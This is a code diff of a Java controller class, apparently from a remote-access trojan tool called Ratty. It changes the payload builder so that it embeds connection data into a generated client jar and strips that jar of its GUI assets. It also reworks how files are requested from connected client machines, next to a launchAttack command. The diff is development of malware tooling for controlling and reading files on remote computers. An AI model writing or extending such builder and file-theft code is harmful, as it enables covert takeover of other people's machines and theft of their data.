@@ -44,8 +44,15 @@ public final class RattyGuiController extends AbstractRattyController implements
 	
 	private HashMap<ActiveConnection, ServerClient> clients;
 	
-	private static final String BUILDER_REPLACEMENT = "/connection_data.txt";
+	private static final String BUILDER_REPLACEMENT = "connection_data.txt";
 	private static final String BUILDER_REPLACEMENT_FORMAT = "%s\r\n%s\r\ntrue";
+	private static final String[] BUILDER_REMOVALS = {
+		"ping.wav",
+		"lato.ttf",
+		"gui_tree_icons.png",
+		"gui_icon.png",
+		"gui_menu_icons.png"
+	};
 	
 	private static final String FREE_WARNING = LANGUAGE.getString("server.free_warning");
 	private static final String FREE_OPTION_YES = LANGUAGE.getString("server.free_yes");
@@ -195,23 +202,13 @@ public final class RattyGuiController extends AbstractRattyController implements
 		gui.update();
 	}
 	
-	private void requestFile(final ServerClient client, final FileTreeNode node) {
+	private void requestFile(final ServerClient client) {
+		final FileTreeNode node = client.fileTree.getLastNodeClicked();
 		final String path = node.getPath();
 		final FileRequestPacket packet = new FileRequestPacket(path);
 		
 		client.fileTree.removeChildren(node);
 		client.connection.addPacket(packet);
-	}
-	
-	private void handleFileTreeCommand(final ServerClient client, final String command) {
-		final FileTreeNode node = client.fileTree.getLastNodeClicked();
-		final FileTreeNode parent = node.getParent();
-		
-		if (parent != null && command != FileTree.REQUEST) {
-			requestFile(client, parent);
-		}
-		
-		requestFile(client, node);
 	}
 	
 	private void startBuilder() {
@@ -238,6 +235,10 @@ public final class RattyGuiController extends AbstractRattyController implements
 		
 		try {
 			JarBuilder.build(destination, BUILDER_REPLACEMENT, replacementData);
+			
+			for (final String removal : BUILDER_REMOVALS) {
+				JarBuilder.removeFile(destination, removal);
+			}
 		} catch (final IOException ex) {
 			gui.showError(BUILDER_ERROR_MESSAGE + "\r\n" + ex.getMessage());
 		}
@@ -260,8 +261,8 @@ public final class RattyGuiController extends AbstractRattyController implements
 			launchAttack();
 		} else if (command == RattyGui.BUILD) {
 			startBuilder();
-		} else if (command == FileTree.NEW_DIRECTORY || command == FileTree.UPLOAD || command == FileTree.REQUEST || command == FileTree.DELETE) {
-			handleFileTreeCommand(client, command);
+		} else if (command == FileTree.REQUEST) {
+			requestFile(client);
 		}
 	}
 	
